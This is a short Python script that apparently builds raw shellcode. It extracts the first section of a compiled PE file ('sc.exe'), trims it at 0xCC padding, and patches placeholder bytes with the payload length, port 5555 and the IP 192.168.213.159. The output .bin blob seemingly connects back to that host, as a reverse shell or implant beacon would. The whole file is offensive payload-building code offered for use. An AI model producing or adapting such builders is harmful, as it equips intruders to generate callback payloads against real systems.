#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import pefile
import struct
import socket
import sys

def EntryPoint(argv):
    try:
        if ( len(argv) < 3 ):
            print("usage: %s [/path/to/sc.exe] [/path/to/raw.bin]" % argv[0]);
            raise SystemExit;
        else:
            #
            # Locates the .text section of the pe
            # file and dumps it to a arbitrary 
            # file to disk.
            #
            fpe = pefile.PE(argv[1]);
            raw = fpe.sections[0].get_data()

            ofs = raw.index(b'\xcc\xcc\xcc\xcc');
            raw = raw[:ofs];
            siz = struct.pack('<I', len(raw));

            raw = raw.replace(b'\x41\x41\x41\x41', siz);
            raw = raw.replace(b'\x42\x42', struct.pack('<H', socket.htons(5555)));
            raw = raw.replace(b'\x43\x43\x43\x43', socket.inet_aton("192.168.213.159"));
            
            bin = open(argv[2], 'wb+');
            bin.write(raw);
            bin.close();

    except Exception as e:
        print("error: %s" % e);

if __name__ in '__main__':
    EntryPoint(sys.argv);
